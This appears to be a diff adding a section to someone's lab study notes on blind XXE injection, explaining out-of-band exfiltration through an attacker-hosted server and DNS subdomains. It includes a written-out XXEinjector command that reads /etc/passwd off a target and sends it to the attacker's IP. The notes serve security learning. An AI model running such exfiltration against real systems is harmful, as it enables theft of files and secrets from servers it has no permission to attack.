@@ -911,3 +911,60 @@ we can then call our external entity and with `&error;`:
 we can do the same thing to view the source code of files by changing the file name in our DTD script to point to a file we want to read like `"file:///var/www/html/submitDetails.php"`  
 however this isn't as reliable because the app may have length limitations and certain special characters might break it 
 
+## Blind Data Exfiltration 
+
+previously we relied on error outputs to view the output of our payloads, but now we will focus on completely blind XXE vulnerabilities 
+
+### Out-of-band data exfiltration 
+
+these attacks are similar to other out-of-band attacks where they involve hosting our own server with our payloads 
+
+now one thing we will do differently is instead of having the web app output our file entity to a specific XML entity, we will make the web app send a request to our server with the content of the file we are reading 
+
+we can first use a parameter entity for the content of the file we are using while using PHP filters and base64 encoding   
+then we will use another external parameter entity to reference it to our IP, and place the file parameter value as part of the URL being requested: 
+
+![](Images/Pasted%20image%2020240227191541.png)
+
+when the XML tries to reference the external `oob` entity from our machine it will request it with the base64 encoded contents of the requested resource in the `content` parameter 
+
+we can even use a script to automatically detect the output and decode it: 
+
+![](Images/Pasted%20image%2020240227191733.png)
+
+first we write the script to index.php and start our php server: 
+
+![](Images/Pasted%20image%2020240227191801.png)
+
+then we call our payload file in our request with the content entity: 
+
+![](Images/Pasted%20image%2020240227192344.png)
+
+and we can see the output in our server: 
+
+![](Images/Pasted%20image%2020240227192520.png)
+
+in addition to storing our base64 encoded data as a URL parameter, we can also use `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (ENCODEDTEXT.our.site.com) then use a tool like tcpdump to capture incoming traffic and decode the sub-domain string to get the data 
+
+### Automated OOB exfiltration 
+
+we can also automate the method we just tried with tools like `XXEinjector`   
+can clone with: 
+
+```shell
+git clone https://github.com/enjoiz/XXEinjector.git
+```
+
+then we need to copy the HTTP request and write it to a file with `XXEINJECT` after it as a postion locator: 
+
+![](Images/Pasted%20image%2020240227192810.png)
+
+then we can run the tool with the `--host` or `--httpport` flags for our IP and port, `--file` for the file with the request, and the `--path` for the file we want to read   
+we can also use `--oob=http` and `--phpfilter` to repeat the OOB attack we did above with: 
+
+```shell
+ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+```
+
+all exfiltrated files get store din the `Logs` folder under the tool which we can view to see the output 
+
